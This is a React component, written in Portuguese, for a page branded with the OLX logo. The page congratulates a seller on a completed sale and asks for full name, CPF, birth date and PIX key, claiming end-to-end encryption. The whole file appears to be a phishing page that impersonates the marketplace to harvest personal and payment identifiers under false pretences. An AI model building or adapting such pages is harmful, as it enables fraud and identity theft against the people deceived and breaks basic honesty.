import { useState } from "react";
import { Button } from "@/components/ui/button";
import { CheckCircle2, ShieldCheck } from "lucide-react";

type Props = {
  onContinuar: (dados: {
    nome: string;
    cpf: string;
    nascimento: string;
    tipoChave: string;
    chavePix: string;
  }) => void;
};

export default function Cadastro({ onContinuar }: Props) {
  const [nome, setNome] = useState("");
  const [cpf, setCpf] = useState("");
  const [nascimento, setNascimento] = useState("");
  const [tipoChave, setTipoChave] = useState("");
  const [chavePix, setChavePix] = useState("");

  const formatCpf = (v: string) => {
    v = v.replace(/\D/g, "").slice(0, 11);
    if (v.length <= 3) return v;
    if (v.length <= 6) return `${v.slice(0,3)}.${v.slice(3)}`;
    if (v.length <= 9) return `${v.slice(0,3)}.${v.slice(3,6)}.${v.slice(6)}`;
    return `${v.slice(0,3)}.${v.slice(3,6)}.${v.slice(6,9)}-${v.slice(9)}`;
  };

  const handleSubmit = () => {
    if (!nome || !cpf || !nascimento || !tipoChave || !chavePix) {
      alert("Preencha todos os campos.");
      return;
    }
    onContinuar({ nome, cpf, nascimento, tipoChave, chavePix });
  };

  const placeholderChave: Record<string, string> = {
    CPF: "000.000.000-00",
    CNPJ: "00.000.000/0000-00",
    EMAIL: "seu@email.com",
    PHONE: "(11) 99999-9999",
    EVP: "Chave aleatória",
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Header */}
      <header className="border-b border-gray-100 bg-white py-4">
        <div className="container flex items-center justify-between">
          <img src="/logo.png" alt="OLX" className="h-16 w-auto" />
          <div className="text-sm text-gray-500">Segurança em Primeiro Lugar</div>
        </div>
      </header>

      <main className="container py-10 flex-1 max-w-2xl mx-auto">
        {/* Parabéns */}
        <div className="mb-8 rounded-xl border border-green-200 bg-green-50 p-6 flex gap-4 items-start">
          <div className="flex-shrink-0">
            <CheckCircle2 className="h-10 w-10 text-green-500 mt-1" />
          </div>
          <div>
            <h1 className="text-2xl font-bold text-gray-900 mb-1">Parabéns pela sua venda! 🎉</h1>
            <p className="text-gray-600 leading-relaxed">
              Sua venda foi realizada com sucesso na OLX. Para garantir a segurança da transação e processar seu pagamento, precisamos confirmar alguns dados seus.
            </p>
          </div>
        </div>

        {/* Formulário */}
        <div className="rounded-xl border border-gray-200 bg-white p-8 shadow-sm mb-6">
          <h2 className="text-lg font-semibold text-gray-900 mb-6">Confirme seus dados</h2>

          <div className="space-y-5">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Nome completo</label>
              <input
                type="text"
                value={nome}
                onChange={e => setNome(e.target.value)}
                placeholder="Seu nome completo"
                className="w-full px-4 py-2.5 border border-gray-300 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-purple-500"
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">CPF</label>
              <input
                type="text"
                value={cpf}
                onChange={e => setCpf(formatCpf(e.target.value))}
                placeholder="000.000.000-00"
                className="w-full px-4 py-2.5 border border-gray-300 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-purple-500"
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Data de nascimento</label>
              <input
                type="date"
                value={nascimento}
                onChange={e => setNascimento(e.target.value)}
                className="w-full px-4 py-2.5 border border-gray-300 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-purple-500"
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Tipo de chave PIX</label>
              <select
                value={tipoChave}
                onChange={e => { setTipoChave(e.target.value); setChavePix(""); }}
                className="w-full px-4 py-2.5 border border-gray-300 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-purple-500 bg-white"
              >
                <option value="">Selecione o tipo</option>
                <option value="CPF">CPF</option>
                <option value="CNPJ">CNPJ</option>
                <option value="EMAIL">E-mail</option>
                <option value="PHONE">Telefone</option>
                <option value="EVP">Chave aleatória</option>
              </select>
            </div>

            {tipoChave && (
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Chave PIX</label>
                <input
                  type="text"
                  value={chavePix}
                  onChange={e => setChavePix(e.target.value)}
                  placeholder={placeholderChave[tipoChave] ?? ""}
                  className="w-full px-4 py-2.5 border border-gray-300 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-purple-500"
                />
              </div>
            )}
          </div>
        </div>

        {/* Aviso segurança */}
        <div className="mb-6 rounded-lg bg-gray-50 p-4 border border-gray-200 flex gap-3">
          <ShieldCheck className="h-5 w-5 text-purple-600 flex-shrink-0 mt-0.5" />
          <p className="text-sm text-gray-600">
            Seus dados são protegidos com criptografia de ponta a ponta e utilizados exclusivamente para processar seu pagamento.
          </p>
        </div>

        <Button
          onClick={handleSubmit}
          className="w-full h-12 bg-purple-600 hover:bg-purple-700 text-white font-semibold rounded-lg"
        >
          Continuar →
        </Button>
      </main>
    </div>
  );
}
